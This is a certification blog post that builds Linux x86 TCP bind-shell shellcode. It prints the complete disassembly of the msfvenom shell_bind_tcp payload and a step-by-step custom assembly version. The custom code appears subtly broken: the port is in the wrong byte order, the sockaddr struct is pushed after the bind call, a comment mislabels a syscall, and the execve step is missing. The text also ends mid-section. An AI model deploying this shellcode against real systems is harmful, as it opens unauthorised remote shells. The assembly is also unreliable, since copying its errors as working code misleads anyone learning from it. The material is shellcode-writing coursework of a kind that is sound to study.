---
title: "SLAE32 0x01: Shell_Bind_TCP Shellcode"
date: 2019-10-19
category: [SLAE32]
tags: [assembly, c, python, exploit development, bind shell, linux, SLAE32]
header:
    teaser: "/assets/images/slae/shell.jpg"
---
## Shell Bind TCP Objectives

Create a Shell_Bind_TCP shellcode that;
1. Binds to an easily configurable port number
2. Executes a shell on an incoming connection

### MSFVenom Shellcode Under the Microscope

A bind shell is a type of shell in which the system on which the code is run binds a TCP socket that is designated to listen for incoming connections to a specified port and IP address. When a bind shell is used, the system on which the bind shell is executed acts as the listener. When a connection is accepted on the bound and listening socket on the designated port and IP address, a shell will be spawned on the system on which the code is run. 

While analyzing shell_bind_tcp shellcode produced by msfvenom, it appears that a total of six syscalls are executed in sequential order. The order goes: `socket`, `bind`, `listen`, `accept`, `dup2`, `execve`. We can analyze unistd_32.h to grab our syscall identifiers:
```
egrep "_socket |_accept |_bind |_listen |_accept4 |_dup2 |_execve " unistd_32.h

#define __NR_execve 11
#define __NR_dup2 63
#define __NR_socket 359
#define __NR_bind 361
#define __NR_listen 363
#define __NR_accept4 364
```

Each serve a purpose in creating a bind shell. Let's analyze the first function in this payload, socket. 

### Referencing MSF Goodies
```msfvenom -p linux/x86/shell_bind_tcp -f raw| ndisasm -u -``` produces a bind shell payload the size of 78 bytes:

```nasm
xor ebx,ebx  
mul ebx  
push ebx  
inc ebx  
push ebx  
push byte +0x2 
mov ecx,esp  
mov al,0x66  
int 0x80 ;;; socket 
pop ebx  
pop esi  
push edx  
push dword 0x5c110002 
push byte +0x10 
push ecx  
push eax  
mov ecx,esp  
push byte +0x66 
pop eax  
int 0x80 ;;; bind
mov [ecx+0x4],eax  
mov bl,0x4  
mov al,0x66  
int 0x80 ;;; listen
inc ebx  
mov al,0x66  
int 0x80 ;;; accept
xchg eax,ebx  
pop ecx  
push byte +0x3f 
pop eax  
int 0x80 ;;; dup2
dec ecx  
jns 0x32  
push dword 0x68732f2f 
push dword 0x6e69622f 
mov ebx,esp  
push eax  
push ebx  
mov ecx,esp  
mov al,0xb  
int 0x80 ;;; execve
```

## Building a TCP Bind Shell.

The socket or SYS_SOCKETCALL is syscall decimal number 102 or hex 0x66 which receives three arguements according to `man7.org/linux/man-pages/man2/socketcall.2.html`. The received arguements are `domain (selects the protocal which we want tcp)`, `type (we want SOCK_STREAM)`, and `protocol ()`.

Any socket in C would be built upon the skeleton below:

```c 
socket_skeleton = int socket(int domain, int type, int protocol);
```

The manpage ip(7) further explains that a TCP socket should be created with these paramaters:

```c 
tcp_socket = socket(AF_INET, SOCK_STREAM, 0);
``` 
which in pseudocode would be translated to:
```c 
tcp_socket = 0x66(2, 1, 0)
```

Further examples of alternate sockets include:

```c
udp_socket = socket(AF_INET, SOCK_DGRAM, 0)
raw_socket = socket(AF_INET, SOCK_RAW, protocol)
```

### Socket
```nasm
global _start

section .text
_start:
;Begin by calling/intializing socket
	
push 0x66 ; rather than xor'ing eax, eax we can do a push 
pop eax   ; of the syscall socket and pop it into eax sparing us a byte (eax).
	
;Feed socket syscall it's arguements starting with domain (1 aka SYS_SOCKET) 
;which can be referenced in /usr/include/linux/net.h.
xor edi, edi  ; clear edi 
push edi      ; push edi (0x0) on stack. protocol=IPPROTO_IO (0x0)
push 0x1      ; put a 1 on the stack
pop ebx	      ; socketcall needs ebx to be 1. this clears ebx and moves 1 to ebx
push ebx      ; push second arg on stack. socket_type=SOCK_STREAM (0x1)
push 0x2      ; push first arg on stack socket_family=AF_INET (0x2)
mov ecx, esp  ; move esp pointer to ecx per socketcall requirements [2, 1, 0]
int 0x80      ; call interrupt to execute socket syscall
```

Let's analyze the `BIND` syscall arguements. A bind function would appear as so:
```int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);```


### Bind
Now that we have created a socket, it is time to bind to a given port.

```nasm	
;int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
;
;syscall number: 361 (0x169)
;Argument Values:
;sockfd = value in eax returned by socket()
;*addr = memory address of structure containing:
;  - sin_family: 0x0002 (AF_INET/IPv4)
;  - sin_port: 0x0539 (1337)
;  - sin_addr.s_addr: 0x00000000 (0.0.0.0)
;addrlen = 0x10 (16/sizeof(sockaddr_in))

mov esi, eax	 ; store sockfd in esi for later use
push esi	 ; store sockfd on stack

mov eax, 0x169   ; bind syscall?
pop ebx 	 ; 0x169(sockfd[3], ) pop sockfd off stack into ebx
push edi	 ; push 0x00000000 (0.0.0.0) sin.addr[last arg] to stack
push word 0x0539 ; push port 1337 to stack
push word 0x0002 ; push AF_INET/IPV4 [2] to stack
mov ecx, esp	 ; mov pointer of stack to ecx
mov edx, 0x10	 ; mov 16 bit address length to edx
int 0x80	 ; execute interrupt 
	
;the structure for sockaddr_in per 'man 7 ip' looks like:
;struct sockaddr_in {
;  sa_family_t    sin_family; /* address family: AF_INET */
;  in_port_t      sin_port;   /* port in network byte order */
;  struct in_addr sin_addr;   /* internet address */
;  }; 
	
push edi	 ; sin_addr; 0x0 ip address 0.0.0.0; the value a is interpreted as a 32 bit value per 'man inet_addr'
push word 0x3905 ; sin_port=1337
push 0x2	 ; sin_family=AF_INET
mov ecx, esp	 ; save pointer to sockaddr_in struct in ecx
```

### Listen
Socket and bind are complete. Next we need to execute the listen syscall.

```nasm
;int listen(int sockfd, int backlog)	
;
;syscall number: 363 (0x16B)
;Arguement Values:
;sockfd = stored in esi (refers to a socket of type SOCK_STREAM)
;backlog = max length to which the queue of pending connections
;	   for sockfd may grow.
;
push 0x16B	; bind syscall
pop eax		; mov bind to eax
mov ebx, esi	; mov sockfd into ebx
mov ecx, 5	; set a backlog of 5 
int 0x80	; interrupt 
```

### Accept
Time to accept incomming connections.

```nasm
;int accept4(int sockfd, struct sockaddr *addr, socklen_t *addrlen, int flags)
;
;syscall number: 364 (0x16C)
;Arguement Values:
;sockfd = stored in esi (refers to a socket of type SOCK_STREAM)
;*sockaddr = NULL (0x00)
;*addrlen = NULLL (0x00)
;flags = NULL
;
mov eax, 0x16C	; accept4 syscall
xor ecx, ecx	; 0x00 sockaddr
xor edx, edx	; 0x00 addrlen
xor esi, esi	; 0x00 flags
int 0x80	; interrupt
```

### Dup2
Redirect STDIN, STDOUT, STDERR.

```nasm
;int dup2(int oldfd, int newfd)
;
;syscal number: 63 (0x3F)
;Arguement Values
;oldfd = previous sockfd value returned by accept4
;newfd = 0, 1, 2 iteratively (stdin, stdout, stderr)

mov ecx, 0x3	; setting up a counter for the loop to iterate through
mov esi, eax	; preserve old sockfd from accept4

sockfd_func:	; create a function to reproduce the same actions
mov eax, 0x3F	; dup2 call
mov ebx, esi	; restore sockfd to oldfd arguement
dec cl		; decrement ecx to 2 then 1 then 0
int 0x80	; interrupt
jnz sockfd_func ; loop back to sockfd_func if not zero
```








```shell
root@kali:~/workspace/SLAE# grep SYS /usr/include/linux/net.h
#define SYS_SOCKET      1               /* sys_socket(2)                */
#define SYS_BIND        2               /* sys_bind(2)                  */
#define SYS_CONNECT     3               /* sys_connect(2)               */
#define SYS_LISTEN      4               /* sys_listen(2)                */
#define SYS_ACCEPT      5               /* sys_accept(2)                */
...

_This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:_

<http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert>

_Student ID: SLAE-1469_

